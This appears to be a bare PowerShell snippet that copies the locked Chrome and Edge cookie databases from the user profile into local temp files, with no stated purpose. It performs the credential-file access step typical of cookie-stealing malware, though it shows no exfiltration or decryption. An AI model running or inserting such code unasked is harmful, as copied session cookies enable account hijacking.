$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"

function Copy-LockedFile($srcPath, $destPath) {
    if (Test-Path $srcPath) {
        try {
            $srcStream = [System.IO.File]::Open($srcPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            $destStream = [System.IO.File]::Create($destPath)
            $srcStream.CopyTo($destStream)
            $srcStream.Close()
            $destStream.Close()
            Write-Host "Successfully copied $srcPath -> size: $( (Get-Item $destPath).Length )"
            return $true
        } catch {
            Write-Host "Copy failed: $_"
            return $false
        }
    }
    return $false
}

Copy-LockedFile $chromePath "temp_chrome_ps.db"
Copy-LockedFile $edgePath "temp_edge_ps.db"
